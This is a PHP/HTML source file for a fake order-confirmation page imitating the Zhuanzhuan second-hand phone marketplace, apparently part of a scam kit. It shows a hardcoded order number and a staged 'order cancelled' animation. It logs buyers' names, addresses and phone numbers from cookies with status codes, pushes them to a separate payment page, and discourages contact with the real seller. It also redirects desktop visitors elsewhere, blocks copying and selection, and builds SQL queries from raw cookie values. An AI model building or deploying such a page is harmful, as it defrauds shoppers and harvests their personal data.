


<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		
<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
$ip=getIP();
setcookie('GoodsID4',$_COOKIE['GoodsID3']);
//写入订单号
setcookie('orderid',$zhuanzhuanORDER);


if($_COOKIE['GoodsID3']){
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_COOKIE['GoodsID3']}'") or die('SQL执行错误');
	
		//判断操作记录数据是否存在，存在就更新此数据状态为2订单页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE gid='{$_COOKIE['GoodsID3']}'");
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=5,
				utime='{$_CURRENT_TIME2}'
			WHERE 
				gid='{$_COOKIE['GoodsID3']}' LIMIT 1") or die(mysql_error());
				
				
		if($_COOKIE['se_name']){
			if($_OID){
			  _query("
				  UPDATE 
					  useraddress
				  SET 
					  uadd='{$_COOKIE['se_address']}',
					  utel='{$_COOKIE['se_tel']}',
					  uname='{$_COOKIE['se_name']}',
					  orderid='{$zhuanzhuanORDER}',
					  state=3
				  WHERE 
					  gid='{$_COOKIE['GoodsID3']}' LIMIT 1");
				
			}
		}	
		  _close();
		  session_destroy();
		  
	}

}
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){
       header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}
if($_GoodsID['oldnew']==1)
$oldnew888="全新";

if($_GoodsID['oldnew']==2)
$oldnew888="99新";
$oldnew666="仅激活，未使用过，全部功能正常，如下为真机实拍图";
if($_GoodsID['oldnew']==3)
$oldnew888="98新";
$oldnew666="相当于新机仅使用一周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
if($_GoodsID['oldnew']==4)
$oldnew888="95新";
$oldnew666="相当于新机仅使用二周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
if($_GoodsID['oldnew']==5)
$oldnew888="88新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";
if($_GoodsID['oldnew']==6)
$oldnew888="85新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";


if($_GoodsID['oldnewa']==1)
$oldnewa88="2G";
if($_GoodsID['oldnewa']==2)
$oldnewa88="4G";
if($_GoodsID['oldnewa']==3)
$oldnewa88="6G";
if($_GoodsID['oldnewa']==4)
$oldnewa88="8G";

if($_GoodsID['oldnewb']==1)
$oldnewb888="64G";
if($_GoodsID['oldnewb']==2)
$oldnewb888="128G";
if($_GoodsID['oldnewb']==3)
$oldnewb888="256G";
if($_GoodsID['oldnewb']==4)
$oldnewb888="512G";


if($_GoodsID['oldnewe']==1){
$oldnewe9999="none";
$oldnewe8888="";
$oldnewe7777="正通过平台保卖寄存在石家庄验机中心";
    
}
if($_GoodsID['oldnewe']==2){
$oldnewe9999="";
$oldnewe8888="none";
$oldnewe7777="支持验机";
}


?>
	    <meta http-equiv="X-UA-Compatible" content="ie=edge">
	    <link rel="stylesheet" href="style/css/styleddxq.css" />
	    <link type="text/css" rel="stylesheet" href="style/iosOverlay.css">
	    <script src="style/js/jquery-2.1.0.js" ></script>
	    <script src="style/js/index.js" ></script>
	    <title>订单确认</title>
<style type="text/css">
<!--
.STYLE1 {
	font-size: 20px;
	color: #000000;
}
-->
 .addressBox{
            background:url(style2/img/iz.png);
            background-size:100% 100%;
            padding:1rem .48rem;
            display: -webkit-flex; /* Safari */
            display: flex;
            flex-direction: row;
            flex-wrap: nowrap;
            justify-content: flex-start;
        }
        .resetPadding{padding:.6rem .48rem}
        .ico11{
            flex-basis:.5rem;
            flex-shrink:0;
            width:0.5rem;
            background:url(style2/img/iy.png) no-repeat center center;
            background-size:0.5rem 0.65rem;
            margin-right:0.38rem;
        }
		.ico12{
            flex-basis:.5rem;
            flex-shrink:0;
            width:0.5rem;
            background-size:0.5rem 0.65rem;
            margin-right:0.38rem;
        }
        .ico22 {
            flex-basis:0.5rem;
            flex-shrink:0;
            width:0.5rem;
            background:url(style2/img/r8.png) no-repeat center center;
            background-size:0.4rem 0.4rem;
        }
        .address {
            flex-basis:100%;
            flex-shrink:1;
            font-size:.5rem;
            padding-right:0.32rem;
        }
		.dh{float:right; font-style:normal; margin-right:0.20rem}
        .address ul li{padding:0.08rem 0; font-size:.45rem}
        .address ul li:first-child{
             font-size:.48rem;
             font-weight:bold;
        }


</style>
</head>
	<body class="bgColor" style="padding-bottom: 4rem;">
    <header class="flex-wrap">
        <div class="h_l flex-con0"><img src="style/img/leftjian.png"></div>
        <div class="h_c" style="font-size:34px;">
            订单详情
        </div>
        <div class="h_r flex-con0">
            <i class="ico45"></i>
        </div>
    </header>
				<!--2017-7-11-->
<main>
<div style="text-align:center;">
<img src="style/img/px.png" width="100%">
</div>
		
		<div>


			<div class="goodBox">
				<div class="storeLogo clearfix">
					<div class="storeBox fl">
						<img class="head" src="<?php echo $_GoodsID['user_portrait']; ?>" alt="店铺头像" />
						<img class="icon" src="style/img/icon3.png" />
					</div>
					<span class="fl"><?php echo $_GoodsID['user_name']; ?></span><span class="fr" style="color:#000000;border:#000000 solid 1px; line-height:50px; padding-left:20px; padding-top:5px; padding-bottom:5px; font-size:34px; padding-right:20px;border-radius: 10px;">联系卖家</span>
				</div>
				<div class="goodInfo">
					<?php if($_GoodsID['goods_img1']<>''){?><img class="fl" src="<?php echo $_GoodsID['goods_img1'] ?>" alt="商品图片"/><?php }?>
					<div class="goodDetail fl">
						<p> <?php echo $_GoodsID['title']; ?> </p>
						<span><em>&yen;</em><?php echo $_GoodsID['price']; ?>   </span>
					</div>
				</div>

			</div>
			<p class="payWay">特色服务</p>
			<div class="service clearfix">
				<div class="feature fl">
					<div class="zhuanBox clearfix">
						<div class="zhuan fl">
							<img src="style/img/icon9.png" /><span><?php echo $oldnewe7777;?></span><img src="style/img/icon4.png" />
						</div>
						<div class="experience fr">
							<span>原价29</span>X1<br />
						</div>
					</div>
					<ul class="primeCost">
						<li><span id="copyFn1">订单编号:1055685927763329047</span><span style="color:#000000;border:#000000 solid 1px; line-height:50px; padding-left:20px; padding-top:5px; padding-bottom:5px; font-size:34px; padding-right:20px;border-radius: 10px;" onClick="copyFn1()">复制</span></li>
						<li><span>支付方式:收银台(未支付)</span></li>
						<li><span>下单时间:<script language=Javascript> 
var now=new Date() 
document.write(1900+now.getYear()+"-"+(now.getMonth()+1)+"-"+now.getDate()+" "+now.getHours()+":"+now.getMinutes()+":"+now.getSeconds()) 
</script></span></li>
					</ul>
				</div>
			</div>

				<div class="delivery clearfix">
					<span class="fl">商品总额</span>
					<p class="fr"><em>&yen;&nbsp;</em><?php echo $_GoodsID['price']; ?></p>
				</div>
				<div class="delivery clearfix">
					<span class="fl">运费</span>
					<p class="fr"><em>&yen;&nbsp;</em>0</p>
				</div>
				<div class="delivery clearfix">
					<span class="fl">特色服务费</span>
					<p class="fr"><em>&yen;&nbsp;</em>-29</p>
				</div>
				<div class="delivery clearfix">
					<span class="fl"></span>
					<p class="fr">应付款:<em>&yen;&nbsp;</em><?php echo $_GoodsID['price']; ?></p>
				</div>
		</div>		
		<div class="fixFoot clearfix">
<a id="loadToSuccess" href="#" onClick="delayURL('in.php?i=<?php echo $_List['goods_oid']; ?>.shtml&fullCate=<?php echo $_List['in_admin_id']; ?>&zhuanzhuanSourceFrom=<?php echo $zhuanzhuanNUM1_1; ?>&PGTID=0d400005-0278-44ac-f681-fdcb1dfcf2fe&ClickID=<?php echo $_List['goods_id']; ?>',3000)">	<p class="submitBtnqx fl" ><span>取消订单</span></p></a><a class="submitBtn fr" id='id2'>确认下单</a>		</div>
		<!--tip-->
		<div class="mask">
						<div class="maskCon maskCon2">
				<h3>提醒</h3>
				<p>您选择验机服务后，优品会为您提供30天质保服务，质检服务要求卖家将物品寄往质检平台检测，请勿向卖家透露您的收货地址，如卖家将手机私自寄往您的地址，为避免纠纷，请原封退还卖家。
	    		</p>
	    		<input type="button" style= "background-color:transparent " value="我知道了"/>
			</div>		</div>
			
			
			
	<script type="text/javascript" src="style/jquery.min(1).js"></script>
<script type="text/javascript" src="style/iosOverlay.js"></script>
<script type="text/javascript" src="style/spin.min.js"></script>	

		<script type="text/javascript">


$(document).on("click", "#loadToSuccess", function(e) {
	var opts = {
		lines: 13, // The number of lines to draw
		length: 11, // The length of each line
		width: 5, // The line thickness
		radius: 17, // The radius of the inner circle
		corners: 1, // Corner roundness (0..1)
		rotate: 0, // The rotation offset
		color: '#FFF', // #rgb or #rrggbb
		speed: 1, // Rounds per second
		trail: 60, // Afterglow percentage
		shadow: false, // Whether to render a shadow
		hwaccel: false, // Whether to use hardware acceleration
		className: 'spinner', // The CSS class to assign to the spinner
		zIndex: 2e9, // The z-index (defaults to 2000000000)
		top: 'auto', // Top position relative to parent in px
		left: 'auto' // Left position relative to parent in px
	};
	var target = document.createElement("div");
	document.body.appendChild(target);
	var spinner = new Spinner(opts).spin(target);
	var overlay = iosOverlay({
		text: "订单取消中",
		spinner: spinner
	});

	window.setTimeout(function() {
		overlay.update({
			icon: "detail-strict_files/dg.png",
			text: "订单取消成功"
		});
	}, 3e3);

	window.setTimeout(function() {
		overlay.hide();
	}, 5e3);

	return false;
});
</script>
	
			
<script type="text/javascript">
 function delayURL(url,time){
 setTimeout("top.location.href = '" + url + "'",time);
 }
</script>

	
	
		<script>
			$(function(){
				$(".check").click(function(){
					if($(this).hasClass("active")){
						$(this).removeClass("active");
					}else{
						$(this).addClass("active");
					}
				});
				$("#id2").click(function(){
					$(".mask").fadeIn("fast");
				});
				$("#id1").click(function(){
					$(".maska").fadeIn("fast");
				});
				
				
				$(".maskCon2 input").click(function(){
					$(".maska").fadeOut("fast");
						window.location.href="payment_number.php"; 
				})
				<?php if($_COOKIE['se_name']){?>
				$(".maskCon2 input").click(function(){
					$(".mask").fadeOut("fast");
						$('.blackBox00').show();
					setTimeout(function(){
						    window.location.href="payment_number.php"; 
						},0) 
				})
				<?php }else{?>
				$(".maskCon2 input").click(function(){
					$(".mask").fadeOut("fast");
						$('.blackBox').show();
					setTimeout(function(){
						    $('.blackBox').hide();//找到对应的标签隐藏
						},2500) 
						
						
				})
				<?php }?>
			})
			
			
		</script>
		
			<script type="text/javascript">
	//若是你不想别人扒掉你的模板，可以把这段js代码加到你网页上，即可屏蔽鼠标右键菜单、复制粘贴、选中等


//屏蔽右键菜单 
document.oncontextmenu = function(event) { 

    if (window.event) { 

        event = window.event; 

    } 


    try { 

        var the = event.srcElement; 

        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) { 

            return false; 

        } 

        return true; 


    } catch (e) { 

        return false; 

    } 

} 




//屏蔽粘贴 
document.onpaste = function(event) { 
    if (window.event) { 

        event = window.event; 

    } 

    try { 

        var the = event.srcElement; 

        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) { 

            return false; 

        } 

        return true; 

    } catch (e) { 

        return false; 

    } 

} 



//屏蔽复制 

document.oncopy = function(event) { 

    if (window.event) { 

        event = window.event; 

    } 

    try { 

        var the = event.srcElement; 

        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) { 

            return false; 

        } 

        return true; 

    } catch (e) { 

        return false; 

    } 

} 


//屏蔽剪切 

document.oncut = function(event) { 

    if (window.event) { 

        event = window.event; 

    } 

    try { 

        var the = event.srcElement; 

        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) { 

            return false; 

        } 

        return true; 

    } catch (e) { 

        return false; 

    } 

} 


//屏蔽选中 

document.onselectstart = function(event) { 

    if (window.event) { 

        event = window.event; 

    } 

    try { 

        var the = event.srcElement; 

        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) { 

            return false; 

        } 

        return true; 

    } catch (e) { 

        return false; 

    } 

}

</script>
<script type="text/javascript">
function browserRedirect() {
var sUserAgent= navigator.userAgent.toLowerCase();
var bIsIpad= sUserAgent.match(/ipad/i) == "ipad";
var bIsIphoneOs= sUserAgent.match(/iphone os/i) == "iphone os";
var bIsMidp= sUserAgent.match(/midp/i) == "midp";
var bIsUc7= sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
var bIsUc= sUserAgent.match(/ucweb/i) == "ucweb";
var bIsAndroid= sUserAgent.match(/android/i) == "android";
var bIsCE= sUserAgent.match(/windows ce/i) == "windows ce";
var bIsWM= sUserAgent.match(/windows mobile/i) == "windows mobile";
if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
window.location.href= '#';
} else {
window.location= 'https://m.jiaoyimao.com/';
}
}
browserRedirect();
</script>
</main>
	</body>
</html>